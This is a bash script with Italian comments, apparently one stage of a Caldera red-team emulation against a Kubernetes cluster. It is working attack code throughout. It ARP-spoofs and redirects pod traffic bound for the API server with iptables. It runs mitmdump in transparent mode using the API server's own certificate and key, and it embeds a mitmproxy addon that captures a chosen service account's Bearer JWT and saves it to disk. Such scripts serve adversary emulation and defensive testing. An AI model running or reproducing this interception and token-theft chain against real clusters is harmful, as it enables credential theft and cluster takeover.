#!/usr/bin/env bash
set -euo pipefail

ADDON_PATH="$DATA_PATH/KC5/addonpy.py"
IFACE="eth0"
IPAPI=$(dig +short kind-cluster-control-plane A)
PIDFILE="$DATA_PATH/KC5/arp_pids"

export OUTPUT_PATH="$DATA_PATH/KC5/found_token"
export TOKEN_PATTERN='Bearer\s+([A-Za-z0-9\-\._~\+/=]+)'
export CHECK_RESPONSES=1
export REQUIRED_SUBSTR="system:serviceaccount:mem:updater-sa"

# 1) Setup
apt update >/dev/null 2>&1 && apt install -y mitmproxy >/dev/null 2>&1
mkdir -p $DATA_PATH/KC5/logdir

# 2) Modifica ip status
sysctl -w net.ipv4.conf.all.rp_filter=0
sysctl -w net.ipv4.conf."$IFACE".rp_filter=0
sysctl -w net.ipv4.ip_forward=1

# 3) REDIRECT del traffico TCP al VIP:6443 verso la porta locale 6443 (mitmdump) escludendo i nodi che si autenticano in mTLS
POD_CIDR="10.0.0.0/8"
iptables -t nat -A PREROUTING -i "$IFACE" -p tcp -s "$POD_CIDR" -d "$IPAPI" --dport 6443 -j REDIRECT --to-ports 6443

# Scrivo l'addon python per fermarsi quando incontra il token
cat > "$ADDON_PATH" <<'PY'
#!/usr/bin/env python3
"""
Mitmproxy addon: rimane attaccato finché non trova il token negli header,
salva **solo il token** su OUTPUT_PATH e poi chiude mitmdump.

Variabili d'ambiente:
 - OUTPUT_PATH (obbligatorio): path file dove salvare il token (es. /tmp/token.txt)
 - HEADER_NAME (opzionale): header da controllare (default: Authorization)
 - TOKEN_PATTERN (opzionale): regex con almeno una capture group per estrarre il token.
    Se non fornita, prova a estrarre un Bearer token; altrimenti salva il valore intero dell'header.
 - CHECK_RESPONSES (opzionale): "1" per controllare anche le response, default "1".
 - REQUIRED_SUBSTR (opzionale): substring da cercare nel payload JWT (default: system:serviceaccount:kube-system:cilium-operator)
"""

from mitmproxy import ctx
import os, re, time, base64, json

OUTPUT_PATH = os.getenv("OUTPUT_PATH")
if not OUTPUT_PATH:
    ctx.log.error("OUTPUT_PATH non impostato. Es: export OUTPUT_PATH=/tmp/found_token.txt")
    raise SystemExit(1)

HEADER_NAME = os.getenv("HEADER_NAME", "Authorization")
TOKEN_PATTERN = os.getenv("TOKEN_PATTERN", "")  # regex; optional
CHECK_RESPONSES = os.getenv("CHECK_RESPONSES", "1") != "0"
REQUIRED_SUBSTR = os.getenv("REQUIRED_SUBSTR", "system:serviceaccount:kube-system:cilium-operator")

token_re = None
capture_group = False
if TOKEN_PATTERN:
    try:
        token_re = re.compile(TOKEN_PATTERN)
        capture_group = "(" in TOKEN_PATTERN
    except re.error as e:
        ctx.log.error(f"TOKEN_PATTERN non valida: {e}")
        raise SystemExit(1)

found_already = False

def atomic_write(path, data_bytes):
    tmp = f"{path}.tmp"
    with open(tmp, "wb") as f:
        f.write(data_bytes)
        f.flush()
        os.fsync(f.fileno())
    os.replace(tmp, path)  # atomic on POSIX

def _strip_bearer(val: str) -> str:
    # Rimuove "Bearer " (case-insensitive) se presente
    if not val:
        return val
    parts = val.strip().split()
    if len(parts) == 2 and parts[0].lower() == "bearer":
        return parts[1]
    return val.strip()

def extract_token_from_value(val: str):
    if token_re:
        m = token_re.search(val)
        if not m:
            return None
        # prefer first capture group if present
        if m.groups():
            return m.group(1)
        return m.group(0)
    else:
        # default: prova a estrarre un Bearer token, altrimenti usa il valore intero
        candidate = _strip_bearer(val)
        return candidate

def _b64url_decode(data: str) -> bytes:
    # padding base64url
    pad = '=' * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + pad)

def decode_jwt_payload(token: str):
    """
    Decodifica il payload del JWT senza verificare la firma.
    Ritorna (payload_dict, payload_raw_json_str) oppure (None, None) in caso di errore.
    """
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return None, None
        payload_b64 = parts[1]
        payload_bytes = _b64url_decode(payload_b64)
        payload_str = payload_bytes.decode("utf-8", errors="replace")
        payload = json.loads(payload_str)
        return payload, payload_str
    except Exception as e:
        ctx.log.warn(f"[save_on_token] Decodifica JWT fallita: {e}")
        return None, None

def payload_matches_requirements(payload_dict, payload_str: str) -> bool:
    """
    Condizione: il payload deve contenere REQUIRED_SUBSTR.
    1) Controllo specifico su 'sub' (classico per i SA Kubernetes)
    2) In fallback, ricerca substring sull'intero JSON serializzato.
    """
    try:
        if isinstance(payload_dict, dict):
            sub = payload_dict.get("sub")
            if isinstance(sub, str) and REQUIRED_SUBSTR in sub:
                return True
        if isinstance(payload_str, str) and REQUIRED_SUBSTR in payload_str:
            return True
    except Exception:
        pass
    return False

def save_and_exit(token, where, flow):
    global found_already
    if found_already:
        return
    found_already = True

    try:
        payload_dict, payload_str = decode_jwt_payload(token)
        if not payload_dict and not payload_str:
            ctx.log.info(f"[save_on_token] Token ignorato: non è un JWT decodificabile.")
            found_already = False
            return

        if not payload_matches_requirements(payload_dict, payload_str):
            ctx.log.info(f"[save_on_token] Token ignorato: payload non contiene '{REQUIRED_SUBSTR}'.")
            found_already = False
            return

        # scrive SOLTANTO il token (con newline finale) nel file
        payload = (token if isinstance(token, str) else str(token)).strip() + "\n"
        atomic_write(OUTPUT_PATH, payload.encode("utf-8"))
        ctx.log.info(f"[save_on_token] Saved token to {OUTPUT_PATH}: {token[:64]}{'...' if len(token)>64 else ''}")
    except Exception as e:
        ctx.log.warn(f"[save_on_token] Errore salvataggio/validazione token: {e}")
        found_already = False
        return

    # trigger shutdown of mitmdump (clean)
    try:
        ctx.log.info("[save_on_token] Shutting down mitmdump")
        ctx.master.shutdown()
    except Exception as e:
        ctx.log.warn(f"[save_on_token] ctx.master.shutdown() failed: {e}; raising KeyboardInterrupt")
        raise KeyboardInterrupt()

class SaveOnToken:
    def check_headers(self, headers, where, flow):
        # headers è un multidict; case-insensitive
        val = headers.get(HEADER_NAME)
        if not val:
            val = headers.get(HEADER_NAME.lower())
        if not val:
            return None
        token = extract_token_from_value(val)
        return token

    def request(self, flow):
        if found_already:
            return
        try:
            token = self.check_headers(flow.request.headers, "request", flow)
            if token:
                save_and_exit(token, "request", flow)
        except Exception as e:
            ctx.log.warn(f"[save_on_token] request handler error: {e}")

    def response(self, flow):
        if found_already or not CHECK_RESPONSES:
            return
        try:
            if not flow.response:
                return
            token = self.check_headers(flow.response.headers, "response", flow)
            if token:
                save_and_exit(token, "response", flow)
        except Exception as e:
            ctx.log.warn(f"[save_on_token] response handler error: {e}")

addons = [
    SaveOnToken()
]
PY
chmod 0755 "$ADDON_PATH"
echo "Addon scritto in: $ADDON_PATH"

/opt/caldera/KC2/nmap-enum.sh $DATA_PATH/KC5
cat /apiserver/apiserver.crt /apiserver/apiserver.key > $DATA_PATH/KC5/inbound.pem
/opt/caldera/KC2/arp-spoof.sh "$IPAPI" "$DATA_PATH/KC5/iphost" "$DATA_PATH/KC5/node_traffic" "$DATA_PATH/KC5/tcpdump_stdout_err.log" "worker" $PIDFILE
mitmdump --mode transparent --listen-host 0.0.0.0 --listen-port 6443 --certs "*=$DATA_PATH/KC5/inbound.pem" --set ssl_insecure=true -w "$DATA_PATH/KC5/node_traffic_decrypted" \
  -s $ADDON_PATH > "$DATA_PATH/KC5/logdir/mitmdump.stdout.log" 2> "$DATA_PATH/KC5/logdir/mitmdump.stderr.log"

/opt/caldera/common/remove-pids.sh $PIDFILE